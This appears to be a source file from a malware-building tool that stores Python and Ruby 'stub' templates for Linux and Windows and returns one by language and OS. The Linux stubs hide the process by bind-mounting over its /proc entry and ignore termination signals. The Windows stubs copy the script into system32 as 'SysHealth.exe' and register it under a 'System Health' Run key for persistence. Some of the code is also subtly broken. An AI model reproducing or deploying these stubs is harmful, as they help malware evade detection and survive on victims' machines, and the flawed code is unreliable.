PYTHON_STUBS = {'linux': """
import socket,os,sys\n
import signal as s
from random import choice as c
def {hide_process}():\n\tch = s.uppercase + s.digits
\ttoken = "".join(c(ch) for i in range(32))
\tif not os.path.isdir("/tmp/%s" % (token)) :\n\tif os.popen("sudo whoami").read() == "root":
\tos.system("sudo mkdir /tmp/%s && sudo mount -o bind /tmp/%s /proc/%s" % (os.getpid(), token, os.getpid()))
\tsignal.signal(signal.SIGTERM, signal.SIG_IGN)\n\tsignal.signal(signal.SIGINT, signal.SIG_IGN)
{hide_process}()
        """, 'windows': """
import socket,os,sys\n
from winreg import OpenKey , SetValueEx
def {hide_process}() :\n\tf = open(str(__file__) , "rb")
\n\tff = open("C:\\Windows\\system32\\SysHealth.exe" , "wb") 
\tff.write(f.read())\n\tf.close()\n\t\n\tff.close()
\tos.system("C:\\Windows\\system32\\SysHealth.exe")
\tSetValueEx("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
             "System Health",0,"REG_SZ", "C:\\Windows\\system32\\SysHealth.exe")
{hide_process}()
        """}


RUBY_STUBS = {'linux': """
def {hide_process}()\n\ttoken = [*('a'..'z'), *('A'..'Z')].shuffle[0,32].join
\n\tif %x("sudo whoami") == "root" 
\t\tif !Dir.exist?("/tmp/%s" % [token])
\t\t\tsystem("sudo mkdir /tmp/%s && sudo mount -o bind /tmp/%s /proc/%s" % [Process.pid, token, Process.pid])
\tend\n\tend\tSignal.trap('TERM', 'IGNORE')\n\tSignal.trap('INT', 'IGNORE')\nend 
{hide_process}
        """, 'windows': """
require 'win32/registry'
def {hide_process}()\n
\tf = File.open(__FILE__, "rb")
\tff = File.open("C:\\Windows\\system32\\SysHealth.exe", "wb")
\tff.puts(f.read)\n\tf.close\n\tff.close
\t%x("C:\\Windows\\system32\\SysHealth.exe")
\tWin32::Registry::HKEY_LOCAL_MACHINE.open(Software\\Microsoft\\Windows\\CurrentVersion\\Run) do |reg|
\treg.write['System Health' Win32::Registry::REG_SZ] = "C:\\Windows\\system32\\SysHealth.exe"\n\tend\nend
{hide_process}
        """}

# i will add java stubs in next release


def _get_python_os_stub(os: str) -> str:
    if "windows" in os.lower():
        return PYTHON_STUBS['windows']
    if "linux" in os.lower():
        return PYTHON_STUBS['linux']

    return ""


def _get_ruby_os_stub(os: str) -> str:
    if "windows" in os.lower():
        return RUBY_STUBS['windows']
    if "linux" in os.lower():
        return RUBY_STUBS['linux']

    return ""


def get_os_stub(lan: str, os_type: str) -> str:
    if lan.lower() == "ruby":
        return _get_ruby_os_stub(os_type)
    if lan.lower() == "python":
        return _get_python_os_stub(os_type)
    return ""
